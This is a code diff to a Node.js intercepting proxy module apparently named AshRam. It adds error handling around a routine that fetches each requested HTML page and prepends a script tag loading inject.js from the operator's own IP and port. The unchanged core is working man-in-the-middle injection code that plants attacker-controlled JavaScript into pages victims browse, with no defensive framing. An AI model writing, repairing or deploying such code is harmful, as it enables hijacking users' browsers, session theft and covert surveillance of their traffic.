@@ -28,9 +28,16 @@ this.call = function(args, mh) {
             }
             if(req.headers.accept.search('text/html') != -1) {
               mh.clog('[AshRam] Injecting into: '.green + req.url);
-              request.get(req.url, function(err,resget,body){
-                res.writeHead(resget.statusCode, resget.headers);
-                res.end("<script src='"+ mh.config.ip + ':' + mh.config.webport + "/inject.js'></script>" + body);
+              var reqgeterror = request.get(req.url, function(err,resget,body){
+                if(resget) {
+                  res.writeHead(resget.statusCode, resget.headers);
+                  res.end("<script src='"+ mh.config.ip + ':' + mh.config.webport + "/inject.js'></script>" + body);
+                } else {
+                  res.end("error");
+                }
+              });
+              reqgeterror.on('error', function() {
+
               });
             } else {
               req.pause();
@@ -53,6 +60,9 @@ this.call = function(args, mh) {
         }));
         mh.varRet('ashramproxy').on('connect', function(req, cltSocket, head) {
           req.on('error', function() {
+
+          });
+          cltSocket.on('error', function() {
 
           });
           try {
